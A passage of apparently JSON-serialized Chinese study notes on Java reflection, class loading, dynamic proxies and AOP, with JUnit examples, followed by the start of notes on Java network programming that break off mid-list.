//方式3(使用最多)：调用Class的静态方法: forName(String classPath)\n        Class clazz3 = Class.forName(\"cn.xpshuai.java1.Person\");\n\n        System.out.println(clazz == clazz2);  // true\n        \n        \n        //方式4(使用较少)：使用类的加载器：ClassLoader\n        ClassLoader classLoader = ReflectionTest.class.getClassLoader();\n        Class clazz4 = classLoader.loadClass(\"cn.xpshuai.java1.Person\");\n\n\n    }\n\n```\n\n\n\n\n\n#### 哪些类型可以有class对象?\n\n1. class: \n   外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类\n2.  interface: 接口\n3. []: 数组\n4. enum: 枚举\n5. annotation: 注解@interface\n6. primitive type:基本数据类型\n7. void\n\n\n\n**Class实例可以是哪些结构的说明：**\n\n![Class实例可以是哪些结构](http://image.xpshuai.cn/Class%E5%AE%9E%E4%BE%8B%E5%8F%AF%E4%BB%A5%E6%98%AF%E5%93%AA%E4%BA%9B%E7%BB%93%E6%9E%84.png)\n\n\n\n\n\n\n\n\n\n\n\n### 类的加载与ClassLoader的理解\n\n#### **类的加载过程：**\n\n\n\n![类的加载过程](http://image.xpshuai.cn/%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.jpg)\n\n\n\n例子：\n\n![类的加载过程例子](http://image.xpshuai.cn/%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B%E4%BE%8B%E5%AD%90.png)\n\n\n\n#### **类的加载器：**\n\n![类的加载器](http://image.xpshuai.cn/%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%99%A8.png)\n\n\n\n![ClassLoader](http://image.xpshuai.cn/ClassLoader.png)\n\n\n\n\n\n\n\n\n\n#### 使用ClassLoader读取配置文件\n\n```java\n    /*\n    Properties: 用来读取配置文件。\n     */\n    @Test\n    public void test4() throws IOException {\n        Properties pros = new Properties();\n        //此时的文件默认在当前的module下\n        //读取配置文件的方式1：\n//        FileInputStream fis = new FileInputStream(\"jdbc.properties\");\n//        FileInputStream fis = new FileInputStream(\"src\\\\dbc.properties\");\n//        pros.load(fis); //加载输入流\n\n        //读取配置文件的方式2（常用）：\n        //此时的文件默认在前的module下的src目录下\n        ClassLoader classLoader = ClassLoaderTest.class.getClassLoader();\n        InputStream is = classLoader.getResourceAsStream(\"jdbc.properties\");\n        pros.load(is);\n\n        String user = pros.getProperty(\"user\");\n        String pass = pros.getProperty(\"pass\");\n        System.out.println(user + pass);\n\n\n\n    }\n\n```\n\n\n\n\n\n\n\n\n\n\n\n### <font color=red>创建运行时类的对象</font>（重点）\n\n\n\n**通过反射，创建对应的运行时类的对象:**\n\n```java\n@Test\npublic void test() throws IllegalAccessException, InstantiationException, ClassNotFoundException {\n    Class clazz = Class.forName(\"cn.xpshuai.java1.Person\");\n\n    // newInstance(): 创建对应的运行时类的对象, 内部调用了运行时类的空参构造器\n    //要想此方法正常的创建运行时类的对象，要求：\n    //1.运行时类必须提供空参的构造器\n    //2.空参的构造器的访问权限得够，通常设置为public\n\n    //在javabean中要求提供一个public的空参构造器，原因：\n    //1.便于通过反射，创建运行时类的对象\n    //2.便于子类继承此运行时类时，默认调用super()时，保证父类有此构造器\n    Object obj = clazz.newInstance();\n    System.out.println(obj);\n\n\n\n}\n```\n\n\n\n\n\n**举例体会反射的动态性：**\n\n```java\n    //体会反射的动态性\n    @Test\n    public void test1() throws IllegalAccessException, InstantiationException, ClassNotFoundException {\n        int num = new Random().nextInt(3); // 0,1,2\n        String classPath = \"\";\n        switch (num){\n            case 0:\n                classPath = \"java.util.Date\";\n                break;\n            case 1:\n                classPath = \"java.lang.Object\";\n                break;\n\n            case 2:\n                classPath = \"cn.xpshuai.java1.Person\";\n                break;\n        }\n\n        Object obj = getInstance(classPath);\n        System.out.println(obj);\n\n\n    }\n\n    //此方法创建一个指定类的对象，classPath: 指定类的全类名\n    public Object getInstance(String classPath) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        Class clazz = Class.forName(classPath);\n        return clazz.newInstance();\n\n    }\n```\n\n\n\n\n\n\n\n\n\n### 获取运行时类的完整结构(了解即可)\n\n先创建一下丰富的Person类的结构(java2包里面)：\n\nPerson.java\n\n```java\npackage cn.xpshuai.java2;\n\nimport java.io.IOException;\n\n/**\n提供结构更丰富的Person类\n */\n\n@MyAnnotation(value = \"Hi\")\npublic class Person extends Creature<String> implements Comparable<String>,MyInterface{\n    private String name;\n    int age;\n    public int id;\n\n    @MyAnnotation(value = \"abc\")\n    public Person() {\n        System.out.println(\"Person的空参构造器\");\n    }\n    private Person(String name) {\n        this.name = name;\n    }\n    Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String display(String interests, int age) throws IOException {\n        return interests + age;\n    }\n\n    @MyAnnotation\n    private void show(String nation){\n        System.out.println(\"show方法,我的国籍是：\" + nation);\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n\n    @Override\n    public void info() {\n        System.out.println(\"info方法，我是一个人\");\n\n    }\n\n    @Override\n    public int compareTo(String o) {\n        return 0;\n    }\n}\n\n```\n\nCreature.java\n\n```java\npackage cn.xpshuai.java2;\n\nimport java.io.Serializable;\n\n\npublic class Creature<T> implements Serializable {\n    private char gender;\n    public double weight;\n\n    public void breath(){\n        System.out.println(\"生物呼吸\");\n    }\n\n    public void eat(){\n        System.out.println(\"生物吃东西\");\n    }\n\n}\n\n```\n\nMyInterface.java\n\n```java\npackage cn.xpshuai.java2;\n\n\npublic interface MyInterface {\n    void info();\n}\n\n```\n\nMyAnnotation.java\n\n```java\npackage cn.xpshuai.java2;\n\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\nimport static java.lang.annotation.ElementType.*;\n\n\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface MyAnnotation {\n    String value() default \"hello\";\n\n}\n\n```\n\n\n\n测试代码(java3包里面)：\n\n```java\npackage cn.xpshuai.java3;\n\nimport cn.xpshuai.java2.Person;\nimport org.junit.Test;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Modifier;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-05 15:28\n * @功能：获取当前运行时类的属性结构\n */\npublic class FieldTest {\n    @Test\n    public void test(){\n        Class clazz = Person.class;\n\n        //获取属性结构\n        //getFields(): 获取当前运行时类及其父类中声明为public访问权限的属性\n        Field[] fields = clazz.getFields();\n        for(Field f: fields){\n            System.out.println(f);\n        }\n\n        //获取声明的属性结构\n        //getDeclaredFields(): 获取当前运行时类当中声明的所有属性(与权限无关)，不包含父类中的属性\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for(Field f: declaredFields){\n            System.out.println(f);\n        }\n\n        System.out.println(\"******************\");\n    }\n\n    //权限修饰符  数据类型  变量名 = ...\n    @Test\n    public void test1(){\n        Class clazz = Person.class;\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for(Field f: declaredFields){\n            //1.权限修饰符\n            //返回的是数字(在Modifier类中有)\n            int modifiers = f.getModifiers();\n//            System.out.println(modifiers);\n            System.out.print(Modifier.toString(modifiers) + \"\\t\"); //翻译回来\n\n            //2.数据类型\n            Class<?> types = f.getType();\n            System.out.print(types.getName() + \"\\t\");\n\n            //3.变量名\n            String fname = f.getName();\n            System.out.print(fname);\n\n            System.out.println();\n\n        }\n\n    }\n\n\n}\n\n```\n\n```java\npackage cn.xpshuai.java3;\n\nimport cn.xpshuai.java2.Person;\nimport org.junit.Test;\n\nimport java.lang.annotation.Annotation;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-05 15:43\n * @功能：获取当前运行时类的方法结构\n \n 框架 = 注解+反射+涉及模式\n */\npublic class MethodTest {\n    @Test\n    public void test(){\n        Class<Person> clazz = Person.class;\n\n        //获取方法结构\n        //getMethods():获取当前运行时类及其父类中声明为public访问权限的方法\n        Method[] methods = clazz.getMethods();\n        for(Method m: methods){\n            System.out.println(m);\n        }\n\n        //getDeclaredMethods():获取当前运行时类当中声明的所有方法(与权限无关)，不包含父类中的方法\n        Method[] dmethods = clazz.getDeclaredMethods();\n        for(Method m: dmethods){\n            System.out.println(m);\n        }\n\n\n\n\n    }\n\n    /*\n    获取运行时类的内部结构\n\n    @Xxx\n    权限修饰符  返回值类型  方法名(参数类型1 形参名1, ...) throws XxxException{}\n     */\n    @Test\n    public void test1(){\n\n        Class clazz = Person.class;\n        Method[] dmethods = clazz.getDeclaredMethods();\n        for(Method m: dmethods){\n            //1.获取方法声明的注解\n            Annotation[] annotations = m.getAnnotations();\n            for(Annotation a: annotations){\n                System.out.println(a);  // @cn.xpshuai.java2.MyAnnotation(value=hello)\n            }\n\n            //2.权限修饰符\n            System.out.print(Modifier.toString(m.getModifiers()) + \"\\t\");\n\n            //3.返回值类型\n            System.out.print(m.getReturnType().getName() + \"\\t\");\n\n            //4.方法名\n            System.out.print(m.getName());\n            System.out.print(\"(\");\n\n            //5.形参列表\n            Class[] parameterTypes = m.getParameterTypes();\n            if(!(parameterTypes == null || parameterTypes.length == 0)){\n                for(int i=0; i< parameterTypes.length; i++){\n                    if(i == parameterTypes.length-1){\n                        System.out.print(parameterTypes[i].getName());\n                        break;\n                    }\n                    System.out.print(parameterTypes[i].getName() +  \", \");\n\n                }\n            }\n            System.out.print(\")\");\n\n            //6.抛出的异常\n            Class[] exceptionTypes = m.getExceptionTypes();\n            if(!(exceptionTypes == null || exceptionTypes.length == 0)){\n                System.out.println(\" throws \");\n                for (int i = 0; i < exceptionTypes.length; i++) {\n                    if(i == parameterTypes.length-1){\n                        System.out.println(exceptionTypes[i].getName());\n                    }\n                        System.out.println(exceptionTypes[i].getName() + \", \");\n                }\n            }\n\n            System.out.println();\n\n        }\n\n\n\n    }\n\n    @Test\n    public void test2(){\n\n    }\n\n\n\n}\n\n```\n\n```java\npackage cn.xpshuai.java3;\n\nimport cn.xpshuai.java2.Person;\nimport org.junit.Test;\n\nimport java.lang.annotation.Annotation;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-05 16:13\n * @功能：\n */\npublic class OtherTest {\n    /*\n    获取构造器结构\n     */\n    @Test\n    public void test(){\n        Class clazz = Person.class;\n\n        // getConstructors(): 当前运行时类中声明为public的构造器\n        Constructor[] constructors = clazz.getConstructors();\n        for(Constructor c: constructors){\n            System.out.println(c);\n        }\n\n        System.out.println(\"*************\");\n\n        // getDeclaredConstructors(): 当前运行时类中的所有的构造器\n        Constructor[] declaredConstructors = clazz.getDeclaredConstructors();\n        for(Constructor c: declaredConstructors){\n            System.out.println(c);\n        }\n\n    }\n\n\n    /*\n    比较重要\n    获取运行时类的父类及父类的泛型\n    代码：逻辑性代码(可以平时搜集保留,到时候复制粘贴) vs 功能性代码\n     */\n    @Test\n    public void test1(){\n        Class clazz = Person.class;\n\n        // getSuperclass(): 获取运行时类的父类\n        Class superclass = clazz.getSuperclass();\n        System.out.println(superclass);  // class cn.xpshuai.java2.Creature\n\n        // getGenericSuperclass(): 获取运行时类的带泛型的父类\n        Type genericSuperclass = clazz.getGenericSuperclass();\n        System.out.println(genericSuperclass);  // cn.xpshuai.java2.Creature<java.lang.String>\n\n        // 基于getGenericSuperclass(), 强转然后...: 获取运行时类的带泛型的父类的泛型\n        Type genericSuperclass2 = clazz.getGenericSuperclass();\n        //做强转\n        ParameterizedType paramType = (ParameterizedType)genericSuperclass2;\n        //获取泛型类型\n        Type[] actualTypeArguments = paramType.getActualTypeArguments();\n        System.out.println(actualTypeArguments[0]); // 形式是这样的   cn.xpshuai.java2.Creature<java.lang.String>\n        System.out.println(actualTypeArguments[0].getTypeName()); //这里就一个，就没for循环. 可以getTypeName()得到 java.lang.String形式\n        System.out.println(((Class)actualTypeArguments[0]).getName()); // 也可以强转为Class然后getName(),    java.lang.String\n\n\n    }\n\n\n    /*\n    比较重要（动态代理中会用）\n    获取运行时类实现的接口\n     */\n    @Test\n    public void test2(){\n        Class clazz = Person.class;\n\n        // 获取运行时类实现的接口\n        Class[] interfaces = clazz.getInterfaces();\n        for(Class c: interfaces){\n            System.out.println(c);\n        }\n\n        System.out.println(\"********\");\n\n        // 获取运行时类实现的接口\n        Class[] interfaces1 = clazz.getSuperclass().getInterfaces();\n        for(Class c: interfaces1){\n            System.out.println(c);\n        }\n\n    }\n\n\n    /*\n    获取运行时类所在的包\n     */\n    @Test\n    public void test3(){\n        Class clazz = Person.class;\n\n        Package aPackage = clazz.getPackage();\n        System.out.println(aPackage);\n\n    }\n\n    \n    /*\n    比较重要\n    获取运行时类声明的注解\n    后面，主要是根据注解获取到注解的内容，判断你要干什么\n */\n    @Test\n    public void test4(){\n        Class clazz = Person.class;\n\n        // 获取运行时类声明的注解\n        Annotation[] annotations = clazz.getAnnotations();\n        for(Annotation a: annotations){\n            System.out.println(a);  // @cn.xpshuai.java2.MyAnnotation(value=Hi)\n        }\n\n    }\n\n    @Test\n    public void test5(){\n\n\n    }\n}\n\n```\n\n\n\n\n\n\n\n\n\n### <font color=red>调用运行时类的指定结构</font>(重要，掌握)\n\n> 主要是调 方法、其次是属性和构造器\n\n\n\n```java\npackage cn.xpshuai.java3;\n\nimport cn.xpshuai.java2.Person;\nimport org.junit.Test;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-06 9:37\n * @功能：\n\n调用运行时类的指定结构(重要，掌握)\n> 主要是调方法、其次是属性和构造器\n\n */\npublic class ReflectionTest {\n\n    /*\n    这个不需要掌握\n     */\n    @Test\n    public void test() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException {\n        Class clazz = Person.class;\n        System.out.println(clazz);\n        //创建运行时类的对象\n        Person p = (Person) clazz.newInstance();\n        System.out.println(p);\n\n        //获取指定的属性(通常不采用此方法，因为非public的无法获取)\n        Field id = clazz.getField(\"id\");\n\n        //设置当前属性的值\n//        set():参数1->指明设置哪个对象的属性   参数2->将此属性值设置为多少\n        id.set(p, 1001);\n\n        //获取当前属性的值\n//        get(): 参数1-->获取哪个对象的当前属性\n        int pid = (int)id.get(p);\n        System.out.println(pid);\n    }\n\n    /*\n需要掌握\n标准的，操作运行时类中的指定的属性\n */\n    @Test\n    public void test1() throws Exception{\n        Class clazz = Person.class;\n        System.out.println(clazz);\n        //创建运行时类的对象\n        Person p = (Person) clazz.newInstance();\n\n\n        //这个常用！！！\n        //1.getDeclaredField(String fieldName):获取指定变量名的属性\n        Field name = clazz.getDeclaredField(\"name\");\n        //2.保证当前属性可访问\n        name.setAccessible(true);  //权限不够的，设置允许方法\n        //3.获取、设置指定对象的属性值\n        name.set(p, \"Jerry\");\n\n        System.out.println(name.get(p));\n        System.out.println(p);\n\n    }\n\n\n    /*\n需要掌握\n标准的，操作运行时类中的指定的方法\n*/\n    @Test\n    public void test2() throws Exception{\n        Class clazz = Person.class;\n        System.out.println(clazz);\n        //创建运行时类的对象\n        Person p = (Person) clazz.newInstance();\n\n\n        //这个常用！！！\n        //1.getDeclaredMethod(String methodName):获取指定变量名的属性\n        //参数1：指明获取的方法的名称。 参数2：指明获取的方法的形参列表\n        Method show = clazz.getDeclaredMethod(\"show\", String.class);\n\n        //2.保证当前方法可访问\n        show.setAccessible(true);  //权限不够的，设置允许方法\n\n        //3.调用invoke()执行: 参数1：方法的调用者，  参数2：给方法形参赋值的实参\n        //invoke()的返回值即为对应类中调用的方法的返回值\n//        show.invoke(p, \"CHN\");\n        Object returnVal = show.invoke(p, \"CHN\");\n        System.out.println(returnVal);\n\n\n\n        System.out.println(\"**************\");\n        //调用静态方法\n//        private static void showDesc()\n        Method sd = clazz.getDeclaredMethod(\"showDesc\");\n        sd.setAccessible(true);\n        //调用，第一个参数写当前class或null\n        sd.invoke(Person.class);  //如果该运行时类的方法没有返回值，则此invoke的返回值为null\n//        sd.invoke(null); //写null也行，丝毫不影响\n\n    }\n\n        /*\n操作运行时类中的指定的构造器（不太常用，因为常用newInstance()来实例化）\n*/\n\n    @Test\n    public void test3() throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {\n        Class clazz = Person.class;\n\n        //1.获取指定的构造器（参数：只需指明参数列表）\n        Constructor constructor = clazz.getDeclaredConstructor(String.class);\n\n        //2.保证此构造器可访问\n        constructor.setAccessible(true);\n\n        //3.创建运行时类的对象\n        Person per = (Person)constructor.newInstance(\"Tom\");\n        System.out.println(per);\n\n    }\n}\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n### 反射的应用: 动态代理\n\n**代理设计模式的原理:**\n使用一个代理将对象包装起来,然后用该代理对象取代康始对象。任何对原始对象的调用都要通过代理。代理对象决定是否以及何时将方法调用转到原始对象上。\n\n之前为大家讲解过代理机制的操作，属于静态代理，特征是代理类和目标对象的类都是在编译期间确定下来，不利于程序的扩展。同时，每一个代理类只能为一个接口服务，这样一来程序开发中必然产生过多的代理。**最好可以通过一个代理类完成全部的代理功能**。\n\n\n\n**动态代理**是指客户通过代理类来调用其它对象的方法，并且是在程序运行时根据需要动态创建目标类的代理对象。\n\n**动态代理使用场合:**\n\n- 调试\n- 远程方法调用\n\n\n\n**动态代理相比于静态代理的优点:**\n抽象角色中（接口）声明的所有方法都被转移到调用处理器一个集中的方法中处理，这样，我们可以更加灵活和统一的处理众多的方法。\n\n\n\n先看一下之前学过的静态代理：\n\n```java\npackage cn.xpshuai.java4;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-06 13:21\n * @功能：静态代理的例子\n *\n * 特点：代理类和被代理类在编译期间，就确定了下来\n */\n\ninterface ClothFactory{\n    void produceCloth();\n\n}\n\n\n//代理类\nclass ProxyClothFactory implements ClothFactory{\n    private ClothFactory factory; // 就用被代理类对象进行实例化\n\n    public ProxyClothFactory(ClothFactory factory){\n        this.factory = factory;\n    }\n\n    @Override\n    public void produceCloth() {\n        System.out.println(\"代理工厂做一些准备工作...\");\n        factory.produceCloth();\n        System.out.println(\"代理工厂做一些后续的收尾工作...\");\n    }\n}\n\n//被代理类\nclass NikeClothFactory implements ClothFactory{\n    @Override\n    public void produceCloth() {\n\n        System.out.println(\"Nike工厂生产运动服\");\n\n    }\n}\n\n\n//测试\npublic class StaticProxyTest {\n    public static void main(String[] args) {\n        //创建被代理类的对象\n        ClothFactory nike = new NikeClothFactory();   //多态的形式\n        //创建代理类的对象\n        ProxyClothFactory proxyClothFactory = new ProxyClothFactory(nike);\n        //代理类的对象调方法\n        proxyClothFactory.produceCloth();\n\n\n    }\n}\n\n```\n\n\n\n动态代理的举例(要求，明白这个逻辑就行，不需要死记代码)：\n\n```java\npackage cn.xpshuai.java4;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-06 13:33\n * @功能：动态代理的举例\n */\n\ninterface Human{\n    String getBelief();\n    void eat(String food);\n}\n\n//被代理类\nclass SuperMan implements Human{\n\n    @Override\n    public String getBelief() {\n        return \"I believe I can fly.\";\n    }\n\n    @Override\n    public void eat(String food) {\n        System.out.println(\"我喜欢吃：\" + food);\n    }\n}\n\n\n/*\n\n要想实现动态代理，需要解决的问题？\n1.如何根据加载到内存中的被代理类，动态的创建一个代理类及其对象\n2.当通过代理类的对象调用方法时，如何动态的去调用被代理类中的同名方法\n\n */\n\nclass ProxyFactory{\n    //调用此方法，返回一个代理类的对象，解决问题1\n    public static Object getProxyInstance(Object obj){ //obj：被代理类的对象\n        MyInvocationHandler handler = new MyInvocationHandler();\n\n        handler.bind(obj);\n\n        return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), handler);\n    }\n\n}\n\nclass MyInvocationHandler implements InvocationHandler{\n    private Object obj; //需要使用被代理类的对象进行赋值\n\n    public void bind(Object obj){\n        this.obj = obj;\n    }\n\n    //当我们通过代理类的对象，请用方法a时，就会自动调用如下的犯法:invoke()\n   //将被代理类要指定的方法a的功能就声明在invoke()中\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // method:即为代理类对象调用的方法，此方法也就作为了被代理类对象要调用的方法\n        // obj: 被代理类的对象\n        Object returnVal = method.invoke(obj, args);\n        //上述方法的返回值就作为当前类中的invoke()的返回值\n        return returnVal;\n    }\n}\n\n\n//测试\npublic class ProxyTest {\n    public static void main(String[] args) {\n        SuperMan superMan = new SuperMan();\n        // proxyInstance: 代理类的对象\n        Human proxyInstance = (Human)ProxyFactory.getProxyInstance(superMan);\n        //当通过代理类对象调用方法时，会自动的调用被代理类中同名的方法\n        String belief = proxyInstance.getBelief();\n        System.out.println(belief);\n        proxyInstance.eat(\"麻辣烫\");\n\n\n        //只需要提供被代理类和接口就行啦\n        System.out.println(\"*************\");\n        NikeClothFactory nikeClothFactory = new NikeClothFactory();\n        ClothFactory proxyClothInstance1 = (ClothFactory)ProxyFactory.getProxyInstance(nikeClothFactory);\n        proxyClothInstance1.produceCloth();\n\n    }\n\n}\n\n```\n\n\n\n![动态代理辅助理解](http://image.xpshuai.cn/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%BE%85%E5%8A%A9%E7%90%86%E8%A7%A3.png)\n\n\n\n\n\n**AOP与动态代理举例：**\n\n> 面向切面编程\n\n![AOP1](http://image.xpshuai.cn/AOP1.png)\n\n![AOP2](http://image.xpshuai.cn/AOP2.png)\n\n\n\n\n\n```java\npackage cn.xpshuai.java4;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-06 13:33\n * @功能：动态代理的举例\n */\n\ninterface Human{\n    String getBelief();\n    void eat(String food);\n}\n\n//被代理类\nclass SuperMan implements Human{\n\n    @Override\n    public String getBelief() {\n        return \"I believe I can fly.\";\n    }\n\n    @Override\n    public void eat(String food) {\n        System.out.println(\"我喜欢吃：\" + food);\n    }\n}\n\n\n/*\n\n要想实现动态代理，需要解决的问题？\n1.如何根据加载到内存中的被代理类，动态的创建一个代理类及其对象\n2.当通过代理类的对象调用方法时，如何动态的去调用被代理类中的同名方法\n\n */\n\nclass ProxyFactory{\n    //调用此方法，返回一个代理类的对象，解决问题1\n    public static Object getProxyInstance(Object obj){ //obj：被代理类的对象\n        MyInvocationHandler handler = new MyInvocationHandler();\n\n        handler.bind(obj);\n\n        return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), handler);\n    }\n\n}\n\nclass MyInvocationHandler implements InvocationHandler{\n    private Object obj; //需要使用被代理类的对象进行赋值\n\n    public void bind(Object obj){\n        this.obj = obj;\n    }\n\n    //当我们通过代理类的对象，请用方法a时，就会自动调用如下的犯法:invoke()\n   //将被代理类要指定的方法a的功能就声明在invoke()中\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        HumanUtil util = new HumanUtil();\n        util.method1();\n\n\n        // method:即为代理类对象调用的方法，此方法也就作为了被代理类对象要调用的方法\n        // obj: 被代理类的对象\n        Object returnVal = method.invoke(obj, args);\n\n        util.method2();\n\n\n\n        //上述方法的返回值就作为当前类中的invoke()的返回值\n        return returnVal;\n    }\n}\n\n\n//测试\npublic class ProxyTest {\n    public static void main(String[] args) {\n        SuperMan superMan = new SuperMan();\n        // proxyInstance: 代理类的对象\n        Human proxyInstance = (Human)ProxyFactory.getProxyInstance(superMan);\n        //当通过代理类对象调用方法时，会自动的调用被代理类中同名的方法\n        String belief = proxyInstance.getBelief();\n        System.out.println(belief);\n        proxyInstance.eat(\"麻辣烫\");\n\n\n        //只需要提供被代理类和接口就行啦\n        System.out.println(\"*************\");\n        NikeClothFactory nikeClothFactory = new NikeClothFactory();\n        ClothFactory proxyClothInstance1 = (ClothFactory)ProxyFactory.getProxyInstance(nikeClothFactory);\n        proxyClothInstance1.produceCloth();\n\n    }\n\n}\n\n\n//测试AOP代理的通用方法\nclass HumanUtil{\n//    通用方法1\n    public void method1(){\n        System.out.println(\"通用方法1\");\n\n    }\n\n//    通用方法\n    public void method2(){\n        System.out.println(\"通用方法2\");\n\n    }\n\n\n\n}\n```\n\n","tags":["动态代理"],"categories":["Java学习"]},{"title":"Java学习之网络编程初涉","url":"%2Fposts%2F46158%2F","content":"\n### 网络编程概述\n\nJava提供的网络类库，可以实现无痛的网络连接，联网的底层细节被l隐藏在 Java的本机安装系统里，由JVM进行控制。并且Java实现了一个跨平台的网络库，**程序员面对的是一个统一的网络编程环境。**\n\n\n\n**计算机网络:**\n把分布在不同地理区域的计算机与专门的外部设备用通信线路互连成一个规模大、功能强的网络系统，从而使众多的计算机可以方便地互相传递信息、共享硬件、软件、数据信息等资源。\n\n\n\n**网络编程的目的:**\n直接或间接地通过网络协议与其它计算机实现数据交换，进行通讯。\n\n\n\n**网络编程中有两个主要的问题:**\n\n- 如何准确地定位网络上一台或多台主机; 定位主机上的特定的应用\n- 找到主机后如何可靠高效地进行数据传输\n\n\n\n**网络模型：**\n\n- OSI参考模型\n- TCP/IP参考模型\n- 五层模型\n\n\n\n\n\n\n\n### 网络通信要素概述\n\n1. IP和端口号\n2. 网络通信协议\n\n\n\n#### 通信要素1：IP和端口号\n\n\n\n##### IP:\n\n> Java使用InetAddress类代替IP\n\n唯一的标识Internet上的计算机（通信实体)\n本地回环地址(hostAddress):127.0.0.1 主机名(hostName): localhost\n\n**IP地址分类方式1:IPV4和IPV6**\nIPV4:4个字节组成，4个0-255。大概42亿，30亿都在北美，亚洲4亿。2011年初已经用尽。以点分十进制表示，如192.168.0.1\n\nIPV6:128位（16个字节），写成8个无符号整数，每个整数用四个十六进制位表示，数之间用冒号(:）分开，如:3ffe:3201:1401:1280:c8ff:fe4d:db39:1984\n\n**IP地址分类方式2:** 公网地址(万维网使用)和私有地址(局域网使用)。\n\n|      | 公网地址                        | 私有地址                                                   |\n| ---- | ------------------------------- | ---------------------------------------------------------- |\n| A    | 1.0.0.0 -127.0.0.0              | 10.0.0.0/8  ---->  10.0.0.0~10.255.255.255（A类）          |\n| B    | 128.0.0.0-191.255.255.255       | 172.16.0.0/12  ----> 172.16.0.0~172.31.255.255（B类）      |\n| C    | 192.0.0.0-223.255.255.255       | 192.168.0.0/16   ---->  192.168.0.0~192.168.255.255（C类） |\n| D    | 240.0.0.0-255.255.255.254(多播) |                                                            |\n\n\n\n##### 端口号：\n\n> 端口号标识正在计算机上运行的进程（程序）\n\n不同的进程有不同的端口号\n被规定为一个16位的整数0~65535。\n\n**端口分类:**\n\n- **公认端口:** 0~1023。被预先定义的服务通信占用（如:HTTP占用端口8o，FTP占用端口21，TeInet占用端口23)\n- **注册端口:** 1024~49151。分配给用户进程或应用程序。(如:Tomcat占用端口8080，MySQL占用端口3306，Oracle占用端口1521等）。\n- **动态/私有端口:** 49152~65535。\n\n\n\n**端口号与IP地址的组合得出一个网络套接字:Socket。**\n\n\n\n```java\n/* * 一、Java使用InetAddress类代替IP\n *\n *\n *\n *三、IP和端口号\n * 1.实例化InetAddress：两个方法：getByName(String host)： 获取ip、getLocalHost(): 获取本机dip\n *                  两个常用方法：getHostName(): 获取主机名称、getHostAddress() : 获取ip地址\n */\n\n@Test\npublic void test() throws UnknownHostException {\n    //实例化InetAddress\n    // getByName(String host)： 获取ip\n    // getLocalHost(): 获取本机dip\n    InetAddress inet1 = InetAddress.getByName(\"192.168.0.112\"); //ip\n    InetAddress inet2 = InetAddress.getByName(\"www.sina.com\"); //域名方式，获取ip\n    InetAddress inet3 = InetAddress.getByName(\"127.0.0.1\");\n    InetAddress inet4 = InetAddress.getLocalHost();\n    System.out.println(inet1);\n    System.out.println(inet2);\n    System.out.println(inet3);\n    System.out.println(inet4);\n\n    //getHostName(): 获取主机名称\n    System.out.println(inet2.getHostName());\n    //getHostAddress() : 获取ip地址\n    System.out.println(inet2.getHostAddress());\n\n\n}\n\n```\n\n\n\n\n\n#### 通信要素2：网络协议\n\n**网络通信协议:**\n计算机网络中实现通信必须有一些约定，即通信协议，对速率、传输代码、代码结构、传输控制步骤、出错控制等制定标准。\n\n计算机网络通信涉及内容很多，比如指定源地址和目标地址，加密解密，压缩解压缩，差错控制，流量控制，路由控制，如何实现如此复杂的网络协议呢?通信协议分层的思想\n在制定协议时，把复杂成份分解成一些简单的成份，再将它们复合起来。最常用的复合方式是层次方式，即同层间可吆通信、上一层可以调用下一层，而与再下一层不发生关系。各层互不影响，利于系统的开发和扩展。\n\n\n\n**传输层协议中有两个非常重要的协议:**\n\n- 传输控制协议TCP(Transmission Control Protocol)\n- 用户数据报协议UDP(User Datagram Protocol)。\n- TCP/IP以其两个主要协议: **传输控制协议(TCP)和网络互联协议(IP)**而得名，实际上是一组协议，包括多个具有不同功能且互为关联的协议。\n- IP(Internet Protocol)协议是网络层的主要协议，支持网间互连的数据通信\n- TCP/IP协议模型从更实用的角度出发，形成了高效的四层体系结构，即**物理链路层、IP层、传输层和应用层**。\n\n\n\n**TCP协议:**\n\n- 使用TCP协议前，须先建立TCP连接，形成传输数据通道\n- 传输前，采用**“三次握手”**方式，点对点通信，是**可靠**的\n- TCP协议进行通信的两个应用进程:客户端、服务端。\n- 在连接中可进行**大数据量的传输**\n- 